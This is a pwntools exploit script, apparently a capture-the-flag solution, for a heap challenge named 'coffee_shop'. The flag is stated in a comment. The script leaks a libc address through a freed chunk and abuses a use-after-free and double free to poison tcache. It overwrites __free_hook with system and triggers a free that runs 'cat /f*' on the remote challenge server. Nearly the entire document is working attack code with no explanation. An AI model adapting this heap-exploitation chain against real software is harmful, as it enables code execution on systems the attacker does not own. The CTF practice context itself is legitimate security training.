# idek{4Nd_7h4t's_h0W_Y0u_3xpl01t_4_k3rn3l_u4f}
from pwn import *

elf = ELF("./coffee_shop")
libc = elf.libc

def sla(s, d):
	target.sendlineafter(s, str(d))

def add(size=0x68, data="speedrun"):
	sla(">", 4)
	sla(":", size)
	sla(":", data)

def free(idx):
	sla(">", 5)
	sla(":", idx)

def edit(idx, data="speedrun"*2):
	sla(">", 6)
	sla(":", idx)
	sla(":", data)

def view(idx):
	sla(">", 7)
	sla(": ", idx)

target = elf.process()
target = remote("coffee-shop.chal.idek.team", 1337)

add(0x480)
add()
free(0)
view(0)
libc.address = u64(target.recvline().strip().ljust(8, '\x00')) - 0x7f3627742be0 + 0x7f3627557000
log.info("LIBC Base: " + hex(libc.address))

free(1)
edit(1)
free(1)
edit(1, p64(libc.sym['__free_hook'] - 8))
add()
add(0x68, "cat /f*\x00" + p64(libc.sym['system']))

free(3)

target.interactive()